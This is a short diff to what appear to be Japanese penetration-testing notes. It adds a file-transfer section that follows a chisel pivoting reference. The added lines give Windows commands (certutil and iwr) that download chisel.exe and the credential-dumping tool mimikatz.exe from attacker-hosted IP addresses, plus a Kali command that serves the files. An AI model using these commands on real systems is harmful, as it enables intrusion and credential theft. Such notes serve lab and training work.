@@ -654,3 +654,14 @@ curl -x socks5://127.0.0.1:1080 http://www.lolcats.com
 ```
 参考
 https://scrapbox.io/rex/Pivoting_with_chisel
+
+### ファイル転送
+Windows 側
+```
+certutil.exe -urlcache -f http://192.168.45.190:8000/chisel.exe chisel.exe
+iwr -uri http://192.168.118.2/mimikatz.exe -Outfile mimikatz.exe
+```
+kali 側
+```
+python3 -m http.server 8000
+```
